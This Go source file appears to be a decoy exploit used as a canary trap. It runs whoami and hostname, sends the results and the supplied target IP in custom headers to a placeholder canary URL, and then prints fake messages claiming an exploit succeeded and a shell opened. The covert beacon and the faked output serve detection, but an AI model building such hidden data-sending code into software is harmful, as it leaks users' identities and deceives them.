package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {

	// Initialise our http client
	client := &http.Client{}
	CANARYURL := "$canary_url"

	// Set out command output to variables
	hnout, err := exec.Command("whoami").Output()
	out, err := exec.Command("hostname").Output()

	if err != nil {
		log.Fatal(err)
	}

	// Pull the target IP from provided arguments
	// Still TODO: Setting prompt text to supply target IP with a flag of some description
	TGTIP := os.Args[2]
	fmt.Println("Target IP is:", TGTIP)

	// set our various strinified things, can probably clean this up at some point
	//fmt.Println(string(out))
	cmdhnout := string(hnout)
	cmdout := string(out)
	TGT := string(TGTIP)

	UA := strings.Replace(cmdhnout, "\r", "", -1)
	UB := strings.Replace(UA, "\n", "", -1)

	CNA := strings.Replace(cmdout, "\r", "", -1)
	CNB := strings.Replace(CNA, "\n", "", -1)

	TargetIPPre := strings.Replace(TGT, "\r", "", -1)
	TargetIP := strings.Replace(TargetIPPre, "\r", "", -1)

	// Initial Web Request
	req, err := http.NewRequest("GET", CANARYURL , nil)
	if err != nil {
		log.Fatalln(err)
	}

	// Set various custom headers, each with a value from command or script in/output
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
	req.Header.Set("X-Username", UB)
	req.Header.Set("X-Hostname", CNB)
	req.Header.Set("X-Target-IP", TargetIP)

	// Make the request with client.Do
	resp, err := client.Do(req)

	// If it errors, print the response and an error
	if err != nil {
		log.Fatalln(err)
		fmt.Println(resp)
	}

	//We Read the response body on the line below.
	// body, err := ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	log.Fatalln(err)
	// }

	// //Convert the body to type string
	// // Do our falsified output
	// sb := string(body)
	//log.Printf(sb)
	fmt.Println("[!] Exploiting Host")
	fmt.Println("[+] Session 1 Opened!")
	fmt.Println("[!] WeGotAShell#>")
	time.Sleep(10 * time.Second)
}

